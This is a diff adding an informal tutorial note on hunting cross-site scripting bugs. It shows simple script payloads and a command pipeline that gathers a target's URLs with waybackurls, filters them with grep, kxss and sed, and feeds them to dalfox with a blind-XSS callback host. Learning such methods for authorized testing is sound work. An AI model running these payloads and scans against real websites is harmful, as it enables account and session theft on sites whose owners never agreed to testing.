@@ -1,0 +1,38 @@
+So in the previous file we had something like '"><script>confirm(1)</script>' so some websites or the developers may block this type of things so in that case we have to use a custom payload lists to get efficient results or we are going to make our own dynamic xss scripts so lets see it..
+------------------------
+Here we had 2 parts such as
+1. 1st check the urls were accepting the special characters or not . So in case if the website / target was accepting and not filtered then we need to choose a correct "xss payloads over there"
+it mean ---> check whether the target accept special characters or not if accept move to 2nd part.
+
+2. We need to use VALID XSS PAYLOAD
+---------------------------------------
+READ THE BELOW LINES:
+
+1. For example we got a list of 1000 urls from a target via WAYBACKURLS tool
+
+2. Now using "grep" we filtered the 1000 targets with the help of "=" symbol and got a result of 500 urls in response
+
+3. Now we have to check that whether the "special characters were filtering or not"
+
+4. If not filtering such as <script>alert(1)</script> then we have to go with valid XSS Payload
+
+5. See the below script
+------------
+$ cat target.txt    ----> just read the file
+| kxss		    ----> This will filterout the special chars
+| sed 's/=.*/=/'    ----> This  will remove everthing after = , add =
+| sed 's/URL: //'   ----> Remove URL: and white spaces
+| dalfox pipe	    ----> dalfox tool for xss payload
+-b https://target.xss.ht --> BXSS payload adder.
+
+kxss was present at tomnomnom github repo
+
+dalfox was found in dalfox github page
+
+so to test only 1st 100 urls in a text file then we use this such as
+
+$ head -n 100 target.txt | remaining cmd
+
+
+
+
